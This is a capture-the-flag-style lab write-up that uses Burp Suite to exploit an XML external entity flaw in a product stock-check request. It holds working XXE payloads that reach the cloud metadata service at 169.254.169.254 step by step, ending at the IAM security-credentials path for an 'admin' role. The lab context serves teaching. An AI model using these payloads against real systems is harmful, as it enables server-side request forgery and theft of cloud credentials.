---
custom_edit_url: null
sidebar_position: 2
---

<figure style={{ textAlign: 'center' }}>
![1](https://github.com/Knign/Write-ups/assets/110326359/1e344e8d-1ff6-42d1-87a4-f25d25fba282)
</figure>

Let's check the stock of one of the products.

<figure style={{ textAlign: 'center' }}>
![2](https://github.com/Knign/Write-ups/assets/110326359/0727cb0b-7aa8-489c-b3b0-e398f1511b2d)
</figure>

Since we are proxying the requests through Burp Suite, we can go to `Proxy > HTTP History` to view the request.

<figure style={{ textAlign: 'center' }}>
![3](https://github.com/Knign/Write-ups/assets/110326359/e8793e33-ef0d-4425-8721-f0c9cf59897e)
</figure>

We can see that the request contains an XML entity.

Let's forward this request to the `Repeater` for further modification.

Once in the `Repeater` tab, declare the following internal entity after the XML prologue:

```
<!DOCTYPE test 
[<!ENTITY test SYSTEM "http://169.254.169.254/">]
>
```

<figure style={{ textAlign: 'center' }}>
![4](https://github.com/Knign/Write-ups/assets/110326359/24d6bb47-0efd-4d29-8d0d-43bc7cf3f83a)
</figure>

Let's add the `latest` endpoint to the entity.

```
[<!ENTITY test SYSTEM "http://169.254.169.254/latest/">]
```

<figure style={{ textAlign: 'center' }}>
![5](https://github.com/Knign/Write-ups/assets/110326359/0dacb303-a3b2-43d7-9d88-5e7a28944bcd)
</figure>

Let's add the `meta-data` endpoint to the entity.

```
[<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/">]
```

<figure style={{ textAlign: 'center' }}>
![6](https://github.com/Knign/Write-ups/assets/110326359/3f5f77bf-c17d-4739-8184-e086aaa8b97b)
</figure>

Let's add the `iam` endpoint to the entity.

```
[<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/">]
```

<figure style={{ textAlign: 'center' }}>
![7](https://github.com/Knign/Write-ups/assets/110326359/a83f8f79-75d0-47b1-8880-0ad6b0ed07ce)
</figure>

Let's add the `credentials` endpoint to the entity.

```
[<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]
```

<figure style={{ textAlign: 'center' }}>
![8](https://github.com/Knign/Write-ups/assets/110326359/cea0c7ba-ce0f-4f36-989f-16c969db0565)
</figure>

Let's add the `admin` endpoint to the entity.

```
[<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/">]
```

<figure style={{ textAlign: 'center' }}>
![9](https://github.com/Knign/Write-ups/assets/110326359/d1a73db1-dab4-4fcb-87df-321525a4bf42)
</figure>

We have solved the lab.

<figure style={{ textAlign: 'center' }}>
![10](https://github.com/Knign/Write-ups/assets/110326359/cbc85714-d4d5-46dc-b7f0-0c09822d6b2c)
</figure>
